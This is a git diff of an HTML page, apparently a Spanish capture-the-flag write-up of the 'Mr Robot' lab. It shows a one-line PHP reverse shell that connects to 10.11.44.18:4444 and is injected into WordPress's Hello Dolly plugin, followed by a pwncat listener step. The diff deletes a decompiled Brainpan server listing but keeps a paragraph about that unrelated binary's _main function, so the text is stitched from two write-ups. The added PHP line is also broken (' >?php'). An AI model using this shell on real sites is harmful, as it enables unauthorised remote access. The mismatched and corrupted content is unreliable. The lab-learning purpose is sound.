@@ -241,92 +241,14 @@ realizar un ataque de fuerza bruta haciendo que vaya descartando nombres de usua
 Al tener accesso a todos los plugins podemos intentar spawnear una <code class="language-plaintext highlighter-rouge">reverse shell</code> a través de la inyección de código malicioso en un plugin que use php.
 </p>
 
-<p class="plain-text">En este caso el elegido ha sido el plugin <code class="language-plaintext highlighter-rouge">Hello Dolly</code> al cual tenemos acceso y funciona con php. Iremos al editor y borraremos su código original dejándolo
-de la siguiente forma: </p>
+<p class="plain-text">En este caso el elegido ha sido el plugin <code class="language-plaintext highlighter-rouge">Hello Dolly</code> al cual tenemos acceso y funciona con php.</p>
+<a href="/thm/mrrobot/10.png" target="_blank"><div><p><img src="/thm/mrrobot/10.png"></p></div></a>
+<p class="plain-text">Iremos al editor y borraremos su código original dejándolo de la siguiente forma: </p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="az"><?php $sock=fsockopen("10.11.44.18",4444); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?></span>
+<code><span class="az"> >?php $sock=fsockopen("10.11.44.18",4444); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?></span>
 </code></pre></div></div><br>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="c1">/* WARNING: Removing unreachable block (ram,0x311716c5) */
 
-</span><span class="no">int</span><span class="p"> __cdecl </span><span class="na">_main</span><span class="p">(</span><span class="no">int</span><span class="am"> _Argc</span><span class="p">,</span><span class="no">char </span><span class="o">**</span><span class="am">_Argv</span><span class="p">,</span><span class="no">char </span><span class="o">**</span><span class="am">_Env</span><span class="p">)
-
-{
-  </span><span class="no">int </span><span class="p">iVar1;
-  </span><span class="na">size_t </span><span class="p">sVar2;
-  </span><span class="na">size_t </span><span class="p">in_stack_fffff9f0;
-  sockaddr local_5dc;
-  sockaddr local_5cc;
-  SOCKET local_5b4;
-  SOCKET local_5b0;
-  WSADATA local_5ac;
-  undefined4 local_414;
-  undefined4 local_410;
-  </span><span class="no">int </span><span class="p">local_40c;
-  </span><span class="no">char </span><span class="o">*</span><span class="p">local_408;
-  </span><span class="no">char </span><span class="o">*</span><span class="p">local_404;
-  </span><span class="no">char </span><span class="o">*</span><span class="p">local_400;
-  </span><span class="no">char </span><span class="p">local_3fc [</span><span class="mi">1016</span><span class="p">];
-  
-  __alloca(in_stack_fffff9f0);
-  ___main();
-  local_400 </span><span class="o">=</span><span class="s"> "_|                            _|                                        </span><span class="mi">\n</span><span class="s">_|_|_|    _|  _|_|    _ |_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><span class="mi">\n</span><span class="s">_|    _|  _|_|      _|    _|  _|  _|    _|  _|     _|  _|    _|  _|    _|</span><span class="mi">\n</span><span class="s">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _ |</span><span class="mi">\n</span><span class="s">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><span class="mi">\n</span><span class="s">                                             _|                          </span><span class="mi">\n</span><span class="s">                                            _ |</span><span class="mi">\n\n</span><span class="s">[________________________ WELCOME TO BRAINPAN _________________________]</span><span class="mi">\n</span><span class="s">                           ENTER THE PASSWORD                              </span><span class="mi">\n\n</span><span class="s">                          >> "</span><span class="p">;  
-  local_404 </span><span class="o">=</span><span class="s"> "                          ACCESS DENIED</span><span class="mi">\n</span><span class="s">"</span><span class="p">;
-  local_408 </span><span class="o">=</span><span class="s"> "                          ACCESS GRANTED</span><span class="mi">\n</span><span class="s">"</span><span class="p">;
-  local_410 </span><span class="o">= </span><span class="mi">9999</span><span class="p">;
-  local_414 </span><span class="o">= </span><span class="mi">1</span><span class="p">;
-  _printf(</span><span class="s">"[+] initializing winsock..."</span><span class="p">);
-  iVar1 </span><span class="o">=</span><span class="p"> _WSAStartup@</span><span class="mi">8</span><span class="p">(</span><span class="mi">0x202</span><span class="p">,</span><span class="o">&</span><span class="p">local_5ac);
-  </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">== </span><span class="mi">0</span><span class="p">) {
-    _printf(</span><span class="s">"done.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
-    iVar1 </span><span class="o">= </span><span class="mi">1</span><span class="p">;
-    local_5b0 </span><span class="o">=</span><span class="p"> _socket@</span><span class="mi">12</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);
-    </span><span class="o">if</span><span class="p"> (local_5b0 </span><span class="o">== </span><span class="mi">0xffffffff</span><span class="p">) {
-      iVar1 </span><span class="o">= </span><span class="p">_WSAGetLastError@</span><span class="mi">0</span><span class="p">();
-      _printf(</span><span class="s">"[!] could not create socket: </span><span class="mi">%d</span><span class="p">",iVar1);
-    }
-    _printf(</span><span class="s">"[+] server socket created.</span><span class="mi">\n</span><span class="s">"</span><span class="p">,iVar1);
-    local_5cc.sa_family </span><span class="o">= </span><span class="mi">2</span><span class="p">;
-    local_5cc.sa_data._2_4_ </span><span class="o">= </span><span class="mi">0</span><span class="p">;
-    local_5cc.sa_data._0_2_ </span><span class="o">= </span><span class="p">_htons@</span><span class="mi">4</span><span class="p">(</span><span class="mi">9999</span><span class="p">);
-    iVar1 </span><span class="o">=</span><span class="p"> _bind@</span><span class="mi">12</span><span class="p">(local_5b0,</span><span class="o">&</span><span class="p">local_5cc,</span><span class="mi">0x10</span><span class="p">);
-    </span><span class="o">if</span><span class="p"> (iVar1</span><span class="o"> == -</span><span class="mi">1</span><span class="p">) {
-      iVar1 </span><span class="o">=</span><span class="p"> _WSAGetLastError@</span><span class="mi">0</span><span class="p">();
-      _printf(</span><span class="s">"[!] bind failed: </span><span class="mi">%d</span><span class="s">"</span><span class="p">,iVar1);
-    }
-    _printf(</span><span class="s">"[+] bind done on port </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">,local_410);
-    _listen@</span><span class="mi">8</span><span class="p">(local_5b0,</span><span class="mi">3</span><span class="p">);
-    _printf(</span><span class="s">"[+] waiting for connections.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
-    local_40c </span><span class="o">= </span><span class="mi">0x10</span><span class="p">;
-    </span><span class="o">while</span><span class="p"> (local_5b4 </span><span class="o">=</span><span class="p"> _accept@</span><span class="mi">12</span><span class="p">(local_5b0,</span><span class="o">&</span><span class="p">local_5dc,</span><span class="o">&</span><span class="p">local_40c), local_5b4 </span><span class="o">!= </span><span class="mi">0xffffffff</span><span class="p">) {
-      _printf(</span><span class="s">"[+] received connection.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
-      _memset(local_3fc,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1000</span><span class="p">);
-      sVar2 </span><span class="o">= </span><span class="p">_strlen(local_400);
-      _send@</span><span class="mi">16</span><span class="p">(local_5b4,local_400,sVar2,</span><span class="mi">0</span><span class="p">);
-      _recv@</span><span class="mi">16</span><span class="p">(local_5b4,local_3fc,</span><span class="mi">1000</span><span class="p">,</span><span class="mi">0</span><span class="p">);
-      local_414 </span><span class="o">=</span><span class="p"> _get_reply(local_3fc);
-      _printf(</span><span class="s">"[+] check is </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">,local_414);
-      iVar1 </span><span class="o">=</span><span class="p"> _get_reply(local_3fc);
-      </span><span class="o">if</span><span class="p"> (iVar1 </span><span class="o">== </span><span class="mi">0</span><span class="p">) {
-        sVar2 </span><span class="o">=</span><span class="p"> _strlen(local_404);
-        _send@</span><span class="mi">16</span><span class="p">(local_5b4,local_408,sVar2,</span><span class="mi">0</span><span class="p">);
-      }
-      </span><span class="o">else</span><span class="p"> {
-        sVar2 </span><span class="o">=</span><span class="p"> _strlen(local_408);
-        _send@</span><span class="mi">16</span><span class="p">(local_5b4,local_404,sVar2,</span><span class="mi">0</span><span class="p">);
-      }
-      _closesocket@</span><span class="mi">4</span><span class="p">(local_5b4);
-    }
-    iVar1 </span><span class="o">=</span><span class="p"> _WSAGetLastError@</span><span class="mi">0</span><span class="p">();
-    _printf(</span><span class="s">"[!] accept failed: </span><span class="mi">%d</span><span class="s">"</span><span class="p">,iVar1);
-  }
-  </span><span class="o">else</span><span class="p"> {
-    iVar1 </span><span class="o">=</span><span class="p"> _WSAGetLastError@</span><span class="mi">0</span><span class="p">();
-    _printf(</span><span class="s">"[!] winsock init failed: </span><span class="mi">%d</span><span class="s">"</span><span class="p">,iVar1);
-  }
-  </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-}</span>
-</code></pre></div></div><br>
+<p class="plain-text">Antes de activar el plugin tendremos que poner el puerto indicado en el script en <code class="language-plaintext highlighter-rouge">modo escucha</code> para ello usaremos la herramienta <code class="language-plaintext highlighter-rouge">pwncat</code></p>
 
 <p class="plain-text">La función <code class="language-plaintext highlighter-rouge">_main</code> hace un par de validaciones, inicializa el <code class="language-plaintext highlighter-rouge">socket</code> y lo mas destacable es que llama a la función <code class="language-plaintext highlighter-rouge">_get_reply</code> pasandole el input del usuario</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
